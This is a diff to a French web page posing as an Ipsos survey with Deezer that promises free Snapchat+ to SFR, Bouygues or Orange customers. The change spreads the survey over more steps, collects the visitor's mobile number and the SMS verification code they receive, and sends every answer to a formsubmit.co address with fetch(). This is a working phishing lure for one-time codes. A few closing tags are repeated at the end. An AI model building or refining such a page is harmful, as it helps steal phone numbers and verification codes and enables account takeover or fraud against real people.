@@ -48,7 +48,8 @@
     </div>
 
     <!-- FORMULAIRE -->
-    <form action="https://formsubmit.co/tonemail@domaine.com" method="POST">
+    <form id="surveyForm" action="https://formsubmit.co/tonemail@domaine.com" method="POST">
+
         <!-- Champ caché pour l'objet du mail -->
         <input type="hidden" name="_subject" value="Réponse au sondage Ipsos" />
         <input type="hidden" name="_captcha" value="false" />
@@ -58,27 +59,39 @@
             <h2>Recevoir Snapchat+ 🎁</h2>
             <p>Pour recevoir Snapchat+, participez à ce sondage en collaboration avec <strong>Deezer</strong>. Offre réservée aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
             <input type="text" name="artiste_prefere" placeholder="Votre artiste préféré" required>
-            <input type="text" name="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer" required>
-            <input type="text" name="artiste_decouverte" placeholder="Artiste découvert récemment" required>
             <button type="button" id="btnEtape1">Suivant</button>
         </div>
 
-        <!-- Étape 2 -->
+        <!-- Étape 2 - Deezer -->
         <div class="box" id="etape2">
-            <h2>Numéro de téléphone</h2>
-            <input type="text" name="telephone" placeholder="Ex: 06XXXXXXXX" required>
+            <h2>Artiste sur Deezer</h2>
+            <input type="text" name="artiste_deezer" placeholder="Artiste que vous écoutez sur Deezer" required>
             <button type="button" id="btnEtape2">Suivant</button>
         </div>
 
-        <!-- Étape 3 -->
+        <!-- Étape 3 - Découverte -->
         <div class="box" id="etape3">
+            <h2>Artiste découvert récemment</h2>
+            <input type="text" name="artiste_decouverte" placeholder="Artiste découvert récemment" required>
+            <button type="button" id="btnEtape3">Suivant</button>
+        </div>
+
+        <!-- Étape 4 - Numéro de téléphone -->
+        <div class="box" id="etape4">
+            <h2>Numéro de téléphone</h2>
+            <input type="text" name="telephone" placeholder="Ex: 06XXXXXXXX" required>
+            <button type="button" id="btnEtape4">Suivant</button>
+        </div>
+
+        <!-- Étape 5 - Code de vérification -->
+        <div class="box" id="etape5">
             <h2>Code de vérification</h2>
             <input type="text" name="code_sms" placeholder="Code reçu" required>
-            <button type="button" id="btnEtape3">Terminer</button>
+            <button type="button" id="btnEtape5">Terminer</button>
         </div>
 
         <!-- Étape finale -->
-        <div class="box" id="etape4">
+        <div class="box" id="etape6">
             <h2>Merci !</h2>
             <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
         </div>
@@ -104,30 +117,60 @@
             document.getElementById('progressText').innerText = percent + "%";
         }
 
-        // Étape 1
+        // Étape 1 : Collecte des données
         document.getElementById('btnEtape1').addEventListener('click', () => {
             let pref = document.querySelector('[name="artiste_prefere"]').value.trim();
-            let deezer = document.querySelector('[name="artiste_deezer"]').value.trim();
-            let decouverte = document.querySelector('[name="artiste_decouverte"]').value.trim();
-            if (!pref || !deezer || !decouverte) { alert("Veuillez remplir toutes les questions."); return; }
-            showStep('etape2', 50);
+            if (!pref) { alert("Veuillez remplir toutes les questions."); return; }
+            reponses.artiste_prefere = pref;
+            showStep('etape2', 20);
         });
 
-        // Étape 2
+        // Étape 2 : Deezer
         document.getElementById('btnEtape2').addEventListener('click', () => {
+            let deezer = document.querySelector('[name="artiste_deezer"]').value.trim();
+            if (!deezer) { alert("Veuillez remplir toutes les questions."); return; }
+            reponses.artiste_deezer = deezer;
+            showStep('etape3', 40);
+        });
+
+        // Étape 3 : Découverte
+        document.getElementById('btnEtape3').addEventListener('click', () => {
+            let decouverte = document.querySelector('[name="artiste_decouverte"]').value.trim();
+            if (!decouverte) { alert("Veuillez remplir toutes les questions."); return; }
+            reponses.artiste_decouverte = decouverte;
+            showStep('etape4', 60);
+        });
+
+        // Étape 4 : Téléphone
+        document.getElementById('btnEtape4').addEventListener('click', () => {
             let tel = document.querySelector('[name="telephone"]').value.trim();
             if (!/^0[67]\d{8}$/.test(tel)) { alert("Numéro invalide (06 ou 07)."); return; }
-            showStep('etape3', 75);
+            reponses.telephone = tel;
+            showStep('etape5', 80);
         });
 
-        // Étape 3
-        document.getElementById('btnEtape3').addEventListener('click', () => {
+        // Étape 5 : Code SMS
+        document.getElementById('btnEtape5').addEventListener('click', () => {
             let code = document.querySelector('[name="code_sms"]').value.trim();
             if (!code) { alert("Veuillez entrer le code."); return; }
-            showStep('etape4', 100);
+            reponses.code_sms = code;
+            showStep('etape6', 100);
+
+            // Envoi des données par mail à chaque étape
+            const formData = new FormData(document.getElementById('surveyForm'));
+            fetch('https://formsubmit.co/tonemail@domaine.com', { method: 'POST', body: formData })
+                .then(response => console.log('Formulaire envoyé', response))
+                .catch(error => console.error('Erreur d\'envoi du formulaire', error));
         });
     </script>
 
 </body>
 </html>
+
+
+    </script>
+
+</body>
+</html>
+
 
